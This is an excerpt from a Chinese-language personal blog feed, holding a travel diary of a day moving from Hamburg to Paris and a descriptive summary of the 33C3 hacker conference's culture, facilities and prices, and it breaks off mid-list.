&lt;li&gt;北站搭 RER  &lt;ul&gt;
&lt;li&gt;因為兩個人的卡都不能刷 RER，而 RER 的現今又只收硬幣不收紙鈔，剛好遇到一位在買 RER 的法國女生，用英文請她幫我們刷卡買兩張前往戴高樂機場的 RER 票，然後我們直接給她 20 歐的現金。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;晚上七點半的飛機  &lt;/li&gt;
&lt;li&gt;安檢得脫鞋子  &lt;/li&gt;
&lt;li&gt;中國大媽  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2017/01/02/33c3-暨歐洲法荷德聖誕跨年遊-14"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (14)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Paris"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (12)</title><link href="https://blog.m157q.tw/posts/2016/12/31/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-12/" rel="alternate"></link><published>2017-01-15T01:07:59+08:00</published><updated>2017-01-15T01:07:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-31:posts/2016/12/31/33c3-暨歐洲法荷德聖誕跨年遊-12/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/30/33c3-暨歐洲法荷德聖誕跨年遊-11"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (11)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 12 2016/12/31 Sat&lt;/h2&gt;
&lt;p&gt;因為要趕早上 6 點的飛機，&lt;br /&gt;
預計 4 點起床出發走去機場。&lt;br /&gt;
大家決議輪班睡覺，&lt;br /&gt;
至少要有兩個人醒著，&lt;br /&gt;
以免只有一個人醒著的話萬一睡著就悲劇了。&lt;br /&gt;
其中一位應該是太累了，&lt;br /&gt;
一到 hostel 之後就先去睡了，&lt;br /&gt;
我自己是沒打算睡就是。  &lt;/p&gt;
&lt;p&gt;醒著的三人拿出在漢堡市區的超市預先買好的火腿片、紅酒，&lt;br /&gt;
還有在阿姆斯特丹多買的一塊起司出來享用，&lt;br /&gt;
邊吃邊聊天。&lt;br /&gt;
其中一位朋友在德國超市花了 2 歐買了一瓶 100ml 的 Vodka，&lt;br /&gt;
還挺好喝的，&lt;br /&gt;
牌子的名字就叫戈巴契夫，&lt;br /&gt;
冷冷的天喝點伏特加真的挺不錯的。  &lt;/p&gt;
&lt;p&gt;吃到一半，&lt;br /&gt;
其中一位也說要先睡一下，&lt;br /&gt;
凌晨 3 點再叫他起床。  &lt;/p&gt;
&lt;p&gt;於是我和另外一位，&lt;br /&gt;
繼續把剩下的食物解決掉，&lt;br /&gt;
不得不說一下，&lt;br /&gt;
在阿姆斯特丹的超市買的起司真的是便宜又好吃。&lt;br /&gt;
吃完以後，&lt;br /&gt;
我精神還挺好的，&lt;br /&gt;
所以就拿出筆電繼續重點式的紀錄一下這篇遊記，&lt;br /&gt;
方便之後回想和補充。  &lt;/p&gt;
&lt;p&gt;到了凌晨 3 點，&lt;br /&gt;
剛剛和我一起解決食物的那位朋友把說要小睡到 3 點的朋友叫醒後就換他去睡哩，&lt;br /&gt;
然後我們就按照計劃拿著 2.99 歐的小小煙火組合到外面找地方施放。&lt;br /&gt;
整條街濃霧彌漫又很冷，&lt;br /&gt;
車子的擋風玻璃都結霜了。&lt;br /&gt;
而且到處都是住宅區，&lt;br /&gt;
附近還有間加油站，&lt;br /&gt;
一時間找不到哪裡可以玩煙火。&lt;br /&gt;
後來打開 Google Map 才看到加油站的對面有塊綠地，&lt;br /&gt;
於是往那個方向走。&lt;br /&gt;
到了之後發現原來是個小公園，&lt;br /&gt;
但其實旁邊還是住家。&lt;br /&gt;
「媽的，不管了，再不放的話我們大概要冷死在外面了。」&lt;br /&gt;
打開小小煙火組合後，&lt;br /&gt;
把火樹銀花點完，&lt;br /&gt;
看著兩盒長的很像火種的東西，&lt;br /&gt;
我們還在納悶他給火種到底要幹嘛，&lt;br /&gt;
然後我們就拿來點，&lt;br /&gt;
啥事都沒發生。&lt;br /&gt;
「幹，給這麼多火種要幹嘛啊？」我怒把它往地上丟。&lt;br /&gt;
「啪！」伴隨著微弱的火光&lt;br /&gt;
「靠，原來是甩炮啊。」&lt;br /&gt;
於是我們度過了很空虛的半小時。  &lt;/p&gt;
&lt;p&gt;回到 hostel 後也差不多凌晨 4 點了，&lt;br /&gt;
於是大伙兒拖著各自的行李前往漢堡機場，&lt;br /&gt;
路上冷冷清清，&lt;br /&gt;
伴隨我們的只有濃霧。  &lt;/p&gt;
&lt;p&gt;走了快半小時終於到達漢堡機場了，&lt;br /&gt;
令我意外的是，&lt;br /&gt;
位在 2 樓的出境大廳已經有不少人在辦理登機了。&lt;br /&gt;
我們是搭 EuroWings 從漢堡前往巴黎戴高樂機場的經濟艙，&lt;br /&gt;
一個人要價 86.49 歐（含機票、機場費、航空稅）&lt;br /&gt;
順利拿到機票後，&lt;br /&gt;
有人提議想吃點東西，&lt;br /&gt;
但出境大廳的餐廳基本上都還沒開，&lt;br /&gt;
所以我們決定到免稅商店區看有沒有東西吃。  &lt;/p&gt;
&lt;p&gt;排隊安檢前還得掃機票的 QR code，&lt;br /&gt;
才能進去排隊等安檢。&lt;br /&gt;
漢堡機場的安檢門挺神奇的，&lt;br /&gt;
似乎是採用微波檢測，&lt;br /&gt;
進入安檢門區域以後要向左轉九十度，&lt;br /&gt;
會看到一個螢幕示意你雙手平伸，&lt;br /&gt;
大概兩秒後就結束，&lt;br /&gt;
然後會有個人體的輪廓圖，&lt;br /&gt;
如果有問題的話，&lt;br /&gt;
該身體部位會被以黃色標示。&lt;br /&gt;
像我是右肩膀的區域顯示黃色，&lt;br /&gt;
於是安檢人員就示意我站到他面前，&lt;br /&gt;
然後背對他，&lt;br /&gt;
一樣雙手平伸，&lt;br /&gt;
讓他檢查我被標黃色區域的部份，&lt;br /&gt;
稍微確認一下沒事以後就放行哩。  &lt;/p&gt;
&lt;p&gt;免稅商店區已經開始營業了，&lt;br /&gt;
到處都有紀念品可買，&lt;br /&gt;
尤其是酒類真的是超級多，&lt;br /&gt;
還有看到台灣的金車噶瑪蘭威士忌也在架上。  &lt;/p&gt;
&lt;p&gt;之後就在候機室等待上飛機，&lt;br /&gt;
這時候我已經有點睡意了。  &lt;/p&gt;
&lt;p&gt;登機之後，&lt;br /&gt;
我們 4 個人的座位是前後兩排，&lt;br /&gt;
但中間都是隔一個人，&lt;br /&gt;
我是坐在後一排靠走道的位置，&lt;br /&gt;
不知道 EuroWings 刻意把一起買的機票的座位排這樣有什麼用意？&lt;br /&gt;
於是我就遇到了一位外國媽媽，&lt;br /&gt;
她的兩個小孩的機票剛好是同一排左邊的中洞和右邊的中洞，&lt;br /&gt;
她問我能不能跟我換個位置，&lt;br /&gt;
讓她的兩個小孩坐在一起比較有伴，&lt;br /&gt;
跟她確認了一下機票沒問題之後，&lt;br /&gt;
我就換到右邊的中洞去坐了，&lt;br /&gt;
新位置的左邊是個一直在玩手機遊戲的黑人，&lt;br /&gt;
右邊則是一位看起來應該就是巴黎的女人，&lt;br /&gt;
因為打扮非常的巴黎（？&lt;br /&gt;
我原本的位置則是剛剛那位媽媽的女兒坐著，&lt;br /&gt;
她的左邊則是她弟弟。&lt;br /&gt;
結果過了不久來了位女人，&lt;br /&gt;
想把她的 20 吋登機箱放在上頭的置物艙，&lt;br /&gt;
但因為置物艙原本就快滿了，&lt;br /&gt;
她硬塞的結果就是，&lt;br /&gt;
下一秒行李箱整個掉下來，&lt;br /&gt;
然後砸到了坐在我原本位置上的小女生的頭，&lt;br /&gt;
但金髮小女生已經到了懂得忍住讓自己不要嚎啕大哭的年紀，&lt;br /&gt;
眼淚就在她的眼眶裡打轉，&lt;br /&gt;
害我看的有點心疼，&lt;br /&gt;
畢竟原本應該是我坐在那個位置上的啊，&lt;br /&gt;
她算是代我受了這皮肉痛。  &lt;/p&gt;
&lt;p&gt;飛機起飛後，&lt;br /&gt;
我就真的累到睡著了，&lt;br /&gt;
一直到飛機降落戴高樂機場的這段時間，&lt;br /&gt;
我都在昏睡中。&lt;br /&gt;
飛行時間大約兩個多小時，&lt;br /&gt;
到達巴黎的時候大概是早上 8 點多，&lt;br /&gt;
降落後才知道從朋友的口中得知原來機上有早餐可以吃，&lt;br /&gt;
但因為我在睡覺，&lt;br /&gt;
空姊就沒有給我了，&lt;br /&gt;
雖然當下覺得有點可惜，&lt;br /&gt;
但後來才知道自己算是因此逃過了一劫而暗自慶幸。  &lt;/p&gt;
&lt;p&gt;戴高樂機場已經不那麼陌生了，&lt;br /&gt;
只是跟我第 1 次來的時候長得不太一樣，&lt;br /&gt;
因為下雪了。  &lt;/p&gt;
&lt;p&gt;總之就照著第 1 天到戴高樂機場的路線走，&lt;br /&gt;
領完行李後搭機場捷運去搭 RER，&lt;br /&gt;
這次試了一下我自己帶的台新昇恆昌聯名卡，&lt;br /&gt;
結果竟然不能刷 RER 的 10 歐，&lt;br /&gt;
似乎會被判斷成 debit card 而被擋刷，&lt;br /&gt;
只好又請同行的友人代刷，&lt;br /&gt;
付給他我身上僅存不多的歐元現金。  &lt;/p&gt;
&lt;p&gt;RER 上，&lt;br /&gt;
仍舊跟第 1 天到巴黎時一樣的髒，&lt;br /&gt;
窗戶也依然是各種刮痕刻字，&lt;br /&gt;
唯一不同的是窗外的景色，&lt;br /&gt;
都成了雪景。  &lt;/p&gt;
&lt;p&gt;搭到巴黎北站後，&lt;br /&gt;
一樣前往第 1 天下榻的旅館借放行李，&lt;br /&gt;
不過這次不是從巴黎北站走，&lt;br /&gt;
因為已經比較熟了，&lt;br /&gt;
所以直接轉搭地鐵到 Anvers 站。  &lt;/p&gt;
&lt;p&gt;行李寄放完後，&lt;br /&gt;
因為大家都不是第 1 天待巴黎了，&lt;br /&gt;
所以就各自分頭行動。  &lt;/p&gt;
&lt;p&gt;我則是因為沒有特別想去哪，&lt;br /&gt;
所以就和其中一位友人一起行動，&lt;br /&gt;
展開了一天徒步在巴黎走將近 30 公里的行程。&lt;br /&gt;
（這是跟我一起行動的友人用 Google Feet 計算出來的，真的是差點把我給累死。）  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;早餐店  &lt;/li&gt;
&lt;li&gt;超市  &lt;/li&gt;
&lt;li&gt;聖心堂  &lt;/li&gt;
&lt;li&gt;盧森堡公園  &lt;/li&gt;
&lt;li&gt;羅浮宮  &lt;/li&gt;
&lt;li&gt;法國漢堡晚餐  &lt;/li&gt;
&lt;li&gt;日本街  &lt;/li&gt;
&lt;li&gt;K-mart 韓國超市  &lt;/li&gt;
&lt;li&gt;旅館  &lt;/li&gt;
&lt;li&gt;走路前往凱旋門跨年  &lt;ul&gt;
&lt;li&gt;兩層安檢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;走回旅館累趴  &lt;ul&gt;
&lt;li&gt;頂樓  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2017/01/01/33c3-暨歐洲法荷德聖誕跨年遊-13"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (13)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Hamburg"></category><category term="Paris"></category></entry><entry><title>33c3 (5)</title><link href="https://blog.m157q.tw/posts/2016/12/30/33c3-5/" rel="alternate"></link><published>2017-02-04T20:47:07+08:00</published><updated>2017-02-04T20:47:07+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-30:posts/2016/12/30/33c3-5/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/30/33c3-4"&gt;33C3 (4)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;總結&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Lightning Talks  &lt;ul&gt;
&lt;li&gt;CCC 的 Lightning Talks 是事先報名制的，不像台灣的 Conf 是採現場報名制，也許是因為這樣，所以水準相對好很多。  &lt;/li&gt;
&lt;li&gt;Lightning Talks 總共有分作三天的下午進行，以下是三天的影片：  &lt;ul&gt;
&lt;li&gt;Day 2: &lt;a href="https://media.ccc.de/v/33c3-8087-lightning_talks_day_2"&gt;https://media.ccc.de/v/33c3-8087-lightning_talks_day_2&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Day 3: &lt;a href="https://media.ccc.de/v/33c3-8088-lightning_talks_day_3"&gt;https://media.ccc.de/v/33c3-8088-lightning_talks_day_3&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Day 4: &lt;a href="https://media.ccc.de/v/33c3-8089-lightning_talks_day_4"&gt;https://media.ccc.de/v/33c3-8089-lightning_talks_day_4&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;各式各樣數不清的社群攤位(他們將每個社群稱之為 Assembly)  &lt;ul&gt;
&lt;li&gt;每個社群可以有自己的議程，公告的話可以自己在會場的柱子或是公告版張貼。  &lt;/li&gt;
&lt;li&gt;焊接、Arduino、LED、3D 列印、雷射雕刻、虛擬實境、BitCoin、BlockChain、Ruby、Python、互動式裝置、CTF、棋藝、開鎖等等等，不勝枚舉。  &lt;ul&gt;
&lt;li&gt;連入口的柱子都是 LED，讓我想到母校台中一中的新校門。  &lt;ul&gt;
&lt;li&gt;&lt;img alt="33C3 pillar" src="/files/33c3/33c3-pillar.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;大多數的人就是在昏暗的環境中拿著一台筆電不停的在敲鍵盤或者是和人開心的交談  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;會期 4 天中，完全不關閉的會場。  &lt;ul&gt;
&lt;li&gt;入口都有工作人員看守著，只有佩帶手環的人才能進入。  &lt;/li&gt;
&lt;li&gt;手環是在報到的時候發的，就是個印有 33C3 字樣的一條帶子加一個鐵環，入場時會有人要你將手環用上面的鐵環束緊到手環無法脫下的狀態，然後用機器壓緊鐵環，使你無法打開，所以這幾天內手環都不能拿下來，等同於你沒辦法把票給不同的人。  &lt;ul&gt;
&lt;li&gt;但其實可以偷偷把手環拆鬆一點就可以拿下來洗澡哩，隔天進會場前再記得戴上就好。  &lt;/li&gt;
&lt;li&gt;沒有任何科技，簡單而原始的作法，杜絕有買票的人把掛在脖子上的 Badge 拿下來給沒買票的人戴就可以進場的問題。  &lt;/li&gt;
&lt;li&gt;戴手環比掛狗牌好看多了  &lt;/li&gt;
&lt;li&gt;不需要曝露自己的名字或暱稱在狗牌身上，想知道這個人是誰的話，就只能用最原始的方式，交談。  &lt;/li&gt;
&lt;li&gt;&lt;img alt="33C3 wristband" src="/files/33c3/wristband.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;會場內有吊床、有沙發、有軟墊，所以有些人乾脆累了就直接睡在會場內，甚至有些人就直接睡在地上。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;所有生物都可入場  &lt;ul&gt;
&lt;li&gt;&lt;img alt="All Creatures Welcome" src="/files/33c3/all-creatures-welcome.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;無論是外星人、人類、貓、狗，所以有些人有帶狗進來，但好像就沒看到有人帶貓了，沒記錯的話帶寵物應該是不用買票就是。  &lt;/li&gt;
&lt;li&gt;到處都可以席地而坐，只要你沒有妨礙到其他人的話，基本上沒有人會管你。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;人手一瓶的軟性飲料：CLUB-MATE  &lt;ul&gt;
&lt;li&gt;用瑪黛(Mate)茶調成的氣泡飲料，有著難以言喻的獨特風味，同行的友人們一致同意最接近的味道大概是：「帶有氣泡的淡烏梅汁」  &lt;/li&gt;
&lt;li&gt;會期這幾天我也是每天至少一瓶，但沒有在會場裏面買就是，因為裏面賣的實在是太貴了，會場裏面一瓶賣 2.5 歐，但我到超市去買，特價只要 0.99 歐，就算加上漢堡的退瓶費 0.15 歐，也還便宜一半啊！  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Club-Mate" src="/files/33c3/club-mate.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;德國人真的非常喜歡喝氣泡飲料，連喝水都要喝氣泡水，估計應該是因為喝有氣泡的啤酒喝習慣了，覺得喝飲料就是要有氣泡。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;各個年齡層的參與者，從嬰兒、兒童、青少年、成人到老人  &lt;ul&gt;
&lt;li&gt;此時歐洲正值聖誕過年期間，來參加的許多人都有小孩子，所以這裡也提供很多給孩童的設施，沒記錯的話還允許購買兒童票，所以聽議程的過程中突然聽到有嬰兒嚎啕大哭別太驚訝，其父母會趕快把嬰兒抱出會議廳，大部分的人也沒有什麼特殊反應。  &lt;ul&gt;
&lt;li&gt;連紀念 T-shirt 都有專門做給小孩子的 size  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;許多父母甚至就把嬰兒放在會場的地毯上爬，這如果在台灣的話應該會被投以異樣的眼光吧，例如：「怎麼放嬰兒在這麼髒的地上爬？」之類的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;四個會議廳、四軌議程、每天從早上十一點到凌晨十二點，除了最後一天只到晚上 6 點就閉幕。  &lt;ul&gt;
&lt;li&gt;其中 3 個會議廳的大小都跟中研院的 R0 差不多大甚至更大，剩下的那個會議廳的大小比中研院的交誼廳再大一些。  &lt;/li&gt;
&lt;li&gt;每個議程的時間大都為 30 ~ 60 分鐘不等，為 Q&amp;amp;A 和一些突發狀況做彈性時間的預留  &lt;/li&gt;
&lt;li&gt;每一個會議廳都會在非議程時間顯示接下來的議程及其時間，以及其他會議廳的議程。會場外的電視也會播放所有會議廳接下來的議程、節錄出來的 twee t以及一些社群或是專案的推廣廣告。  &lt;/li&gt;
&lt;li&gt;每個會議廳只要滿了，為了維護議程的品質與空間，工作人員會開始在入口禁止會眾繼續進入，也不准席地而坐，當然也不准佔位的行為，有時候允許站著，但有時候也會請站著的人離開，因為基本上都有直播可以看，沒佔到位置的人就請看直播吧。  &lt;/li&gt;
&lt;li&gt;佔位的行為非常少，熱門的議程整個會議廳都坐滿沒有背包佔位的情況非常常見。而且我遇到有先幫朋友佔位的人，到議程開始的時候朋友都有出現。不知道是不是因為沒有桌子的關係，所以也不會有人把筆電就直接放在桌上佔位。反觀台灣的 Conference，許多人都會有事先佔位的情形，而且甚至議程開始了也根本沒回到位置上，就這樣佔了個位置過了一整個議程。  &lt;/li&gt;
&lt;li&gt;基本上很少議程是完全沒有人問問題的，而且大多數人問的問題都非常精闢或非常深入，就算沒有，也很少聽到有人問一些不相關的問題。  &lt;ul&gt;
&lt;li&gt;我覺得這也算是我要努力的方向，我自認自己無法當下想出這樣的問題，而且就算想出了，我也不確定自己有沒有自信在當下發問。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;發問用的麥克風只有設定在幾個區域，所以想要發問的人必須走到麥克風附近站著等候主持人提示後發問。  &lt;ul&gt;
&lt;li&gt;不像台灣的 Conf 可能在座位上就配有麥克風，或者是會有工作人員把麥克風遞給你。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;無性別廁所（UNISEX WC)，廁所不分男女。  &lt;ul&gt;
&lt;li&gt;會眾的男女比挺平均的，很多女生也是筆電上貼著各式各樣的貼紙，然後就專注的盯著筆電的螢幕在敲鍵盤，不像台灣大多數的 Conference 都還是男生居多。我想這是個可以努力的方向，但可能跟整個國家的教育方式還有社會期望也有關係就是。  &lt;/li&gt;
&lt;li&gt;幾乎所有的廁所原本在門上的男女圖示都被貼 UNISEX WC 的紙貼掉，成為無性別廁所，無論性別，一律共用。  &lt;/li&gt;
&lt;li&gt;雖然是這樣，但我稍微觀察了一下，大多數的本地人都還是會照原本的性別進去，女生左邊、男生右邊，可能是因為習慣了吧。  &lt;/li&gt;
&lt;li&gt;但基本上如果有生理女性進去原本的男廁或生理男性進去原本的女廁也不會有任何問題。  &lt;/li&gt;
&lt;li&gt;我就有進去原本的女廁，也體驗到排隊等待的時間真的很長，兩間同樣都只有 4 個隔間式的廁所，但男廁還有 6 個小便斗，也因為要有小便斗的關係，男廁空間是比女廁空間還大的，但隔間式廁所的使用率反而沒有女廁高。  &lt;/li&gt;
&lt;li&gt;使用原本的男廁時也有女生走進來使用廁所，也沒什麼事情發生。  &lt;/li&gt;
&lt;li&gt;倒是我最不習慣的一點是歐洲的小便斗之間都不會有隔版，而且小便斗頂部也不會有個平台，所以你站的再近基本上都還是會被看到就是，所以就別在意了，貼更近只會讓自己的褲子溼了。  &lt;/li&gt;
&lt;li&gt;後來在 Closing Ceremony 的時候有秀一張照片是，有人把 UNISEX 貼掉改成 CyberSex，結果大家都笑了，真的是有夠宅（稱讚意味） XDDD  &lt;ul&gt;
&lt;li&gt;我有看到被貼成 CyberSex 的牌子，但忘記拍下來了 Orz  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最多人用的筆電是 IBM 的 ThinkPad （小黑），不是 MacBook。  &lt;ul&gt;
&lt;li&gt;身為一個標準的 Hacker，當然是不需要滑鼠也不需要觸控版，只需要能讓手保持在打字區維持最高效率的小紅點。  &lt;/li&gt;
&lt;li&gt;然後運行的作業系統大多數都是 Linux，至於是什麼 Distro 就因人而異，有看到有人灌 Mint，也有看到有人灌 Debian。  &lt;/li&gt;
&lt;li&gt;當然還是有看到人用 Windows 和 OS X 就是，只是極少。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;非常重視隱私，拍照的時候最好裏面不要有人，如果有人入鏡的話必須先徵得所有入鏡的人的同意。  &lt;ul&gt;
&lt;li&gt;會場很多地方都有「拍照之前請先徵得所有入鏡的人的同意」的標語  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Ask before taking photo" src="/files/33c3/ask-before-taking-photo.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;同行的友人拿出相機在拍照的時候，工作人員還特地過來講說不要隨便對著人拍照，最好只拍沒有人入鏡的照片，因為去年貌似有人因為這個而鬧出問題的樣子。  &lt;/li&gt;
&lt;li&gt;沒有攝影組拍照，攝影組負責的應該就是議程的錄影錄音而已。  &lt;ul&gt;
&lt;li&gt;不像台灣的 Conf，常常會眾都要被一堆閃光燈閃。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;幾乎所有東西都是要錢的。  &lt;ul&gt;
&lt;li&gt;食物都是要錢的，應該是請合作的攤販進來擺攤，有 Coffee Bike、可麗餅、漢堡、泰式咖哩、披薩、熱狗堡，各式各樣，但價格偏貴，而且食物內幾乎是沒有蔬菜的。  &lt;ul&gt;
&lt;li&gt;這個漢堡要 6.5 歐，現場煎的牛排真的很香很誘人，不過我只吃一次就是。  &lt;ul&gt;
&lt;li&gt;&lt;img alt="33C3 burger" src="/files/33c3/33c3-burger.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這個熱狗堡要 5 歐（還沒加料，料在旁邊可以自己加）  &lt;ul&gt;
&lt;li&gt;&lt;img alt="33C3 hot dog" src="/files/33c3/33c3-hot-dog.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不像台灣的 Conference，會眾大多已經習慣有免費或包含在票價裡的上午茶點、便當、下午茶點。  &lt;/li&gt;
&lt;li&gt;基本上我覺得這點跟歐洲的價值觀是相符合的，台灣就是有太多的免費，其實背後隱藏的都是不合理的過勞或是沒有得到相對應價值的被壓榨。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;基本上每個會議廳外都有販售飲料的吧台，飲料的售價也比超市硬是貴上快一倍，但畢竟他們幫你把飲料直接運來會場賣，只能說不爽不要買。  &lt;ul&gt;
&lt;li&gt;用台灣的收入來歐洲消費真的有點吃不消，很多東西都覺得貴，所以我的作法就是去超市買 CLUB-MATE 再帶進去會場喝，後來連午餐晚餐都是這樣做。  &lt;ul&gt;
&lt;li&gt;這種時候就會好想換個 remote job 領美金或歐元的薪水但花台幣度日子啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;沒有攤位會免費贈送你贈品，例如我去參加的 Lock Picking Workshop，想要有一組開鎖工具拿來練習的話，就請去旁邊購買一組，最低要價 15 歐。免費的贈品最多就是貼紙吧，還有一個攤位好像是可以拿他發出去的 QR code 去攤位找機器掃 QR code，然後機器會推出一條德國香腸給你。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;沒什麼東亞人和黑人的面孔  &lt;ul&gt;
&lt;li&gt;大概就我和同行的友人共 4 個人，還有第二天晚上一個中國人在講解無線電構成的網路，還有看到一個用著轉接頭充筆電的女生，再加上其他有看到的，全部加起來可能不到 20 個吧。  &lt;/li&gt;
&lt;li&gt;基本上對外國人不會有什麼特別的反應，所以敢主動與他們交談才是重點，但我自己這方面極度欠缺自信就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;各種特別的東西  &lt;ul&gt;
&lt;li&gt;Lounge Area  &lt;ul&gt;
&lt;li&gt;一個超大的像夜店的區域，裏面可以吸煙，昏暗的燈光加上閃爍的光線，再搭配著震耳欲聾的電音，就是個搖頭的地方。  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Lounge Area" src="/files/33c3/lounge-area.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;EventPhone  &lt;ul&gt;
&lt;li&gt;&lt;img alt="eventphone" src="/files/33c3/eventphone.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;每個人可以申請，會得到一組四位數字的代號，都擁有 EventPhone 的人可以直接用代號打電話給對方，也可以免費打國際電話。  &lt;/li&gt;
&lt;li&gt;需要支援 GSM 的 SIM 卡（會場內有人兜售，價格是 5 歐，不過不知道安全性如何就是,因為我不確定是不是工作人員在賣，感覺不是。）  &lt;/li&gt;
&lt;li&gt;或是支援 DECT 的無線電話也可。  &lt;/li&gt;
&lt;li&gt;這個似乎有段故事，聽說今年原本 EventPhone 會有問題，結果 CCC 裏面有人直接跟德國的電信商談，然後就搞定了這件事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;氣動膠囊網路（Seidenstraße）  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Seidenstraße-1" src="/files/33c3/Seidenstraße-1.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Seidenstraße-2" src="/files/33c3/Seidenstraße-2.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;Seidenstraße 的意思是絲路，對，就是那個絲路。但在這裡翻譯成氣動膠囊網路，因為它是透過空氣當作動力來傳輸的。  &lt;ul&gt;
&lt;li&gt;聽說產生空氣動力來源的裝置是吸塵器 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;實體膠囊（被稱做 bubble，其實就是一個塑膠球），通過驗證之後，再輸入想把膠囊送到會場內哪個地方的代號之後，膠囊就會被發射出去並送該處，發射的時候因為塑膠管不是平滑的，所以會有一個很酷的、持續的「唰」的聲音。  &lt;/li&gt;
&lt;li&gt;這是 30C3 時的相關介紹 &lt;a href="https://events.ccc.de/2013/12/08/seidenstrasse/"&gt;Seidenstrasse – a pneumatic tube system for 30C3 «  CCC Event Weblog&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有一塊區域專門在做現場訪談  &lt;ul&gt;
&lt;li&gt;但都是講德文，所以我聽不懂就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Speaker Sofa  &lt;ul&gt;
&lt;li&gt;這邊似乎是讓講者待在這邊，給講者之間或和會眾交流用，有時也有一些類似訪談的活動，有些人會坐在這聆聽，因為也是德文，所以我聽不懂。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;會場內可以騎滑板車、電動滑板車、溜滑板，只要你敢而且不會撞到人的話，不會有人阻止你。  &lt;/li&gt;
&lt;li&gt;有人用滑雪板加彈簧還有 sensor 自己 hack 一個遊戲出來，玩家可以站在有彈簧的滑雪版上移動來讓滑雪中的 Tux 改變行進方向，Tux 吃到愈多魚則得分愈高。  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Snowboard Hacker" src="/files/33c3/snowboard-hacker.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有人寫了一個計算沙堆與 sensor 之間的距離然後根據這個距離來幫不同高度的區域上色，然後利用投影機和鏡子把顏色投影在沙子上面，做出類似實體等高線圖的效果。  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Sand" src="/files/33c3/sand.jpg" /&gt;  &lt;/li&gt;
